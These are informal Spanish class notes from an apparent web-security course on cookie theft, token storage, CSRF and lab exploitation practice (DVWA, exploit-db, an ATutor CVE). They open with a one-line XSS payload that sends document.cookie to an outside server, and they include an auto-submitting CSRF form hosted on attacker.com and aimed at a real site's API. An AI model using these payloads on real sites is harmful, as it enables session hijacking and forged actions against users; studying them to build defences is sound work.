robar cookie
new Image().src = "http://myserver.com/cookie="+document.cookie
asi me manda a mi servidor su cookie
ahora seteo mi cookie con los datos que me mandaste
set cookie sessionid=-----

Otros tipos de auth
Tokens
bearer token = --
no se guarda como cookie sino en session storage o local storage

hay otras formas(index db)
el browser tiene diferentes tipos de storage para guardar cosas

CSRF
cuando hago una request a un servidor el browser envia las cookies de ese servidor
Ej
GET /API?foo=1 HTTP/1.1		POST /API?DELETE complete account HTTP/1.1
HOST:www.facebook.com
....(content type, etc)
cookies:Lang=ES;SessionId=---

si en mi servidor tengo una pag con un formulario
hosteado en attacker.com
<form id=1 action="http://www.facebook.com/api?foo=1" method=POST">confirm=true
<input type="text" name='confirm' value='true' />
</form>
<script>
var f=document.GetElementById(1);
f.submit();
</script>

Yo force un get o un post a la api de facebook
se abusa el hecho de que la cookies se incluyen
solucion: no usar sesion con cookies
otra: incluir un csrf token
no usar la session id como cookie sino token aparte
incluir como cookie un parametro adicional que se llame csrf token


Estoy forzando una request cruzada hacia otro dominio

con beef podemos inyectar el js para ver que obtenemos del browser

aprender a encadenar proxys

bases de datos de vulnerabilidades
exploitdb.com
agarrar aplicacion web instalarla y explotar el bug
nosotros instalamos y nosotros explotamos
reescribir el expliot y explicar como funciona

CSRF es para que la aplicacion realice acciones que queremos
en DVWA sirve para cambiar la password
CSRF son especificos para logica de aplicacion

Para levantar un webserver con python
python -m SimpleHTTPServer 192.168.116.120:8888

explotar atutor v2.2.1
CVE bug 2016 2555
directory traversal
sql inyection
hay un modulo de metasploit

intentar hacer el CSRF con
XHR Example
var xmlhttprequest = new XMLHTTPRequest()
....send(a dvwa)

lO QUE HABIA QUE HACER HOY ERA CON JAVASCRIPT O JQUERY HACER UNA REQUEST

buscar api de fetch
opcion no_cors

web request
httprequest
apis para hacer request en js

se puede hacer con iframes

que pasa si el pww se actualiza por PUT??
no se va a poder hacer csrf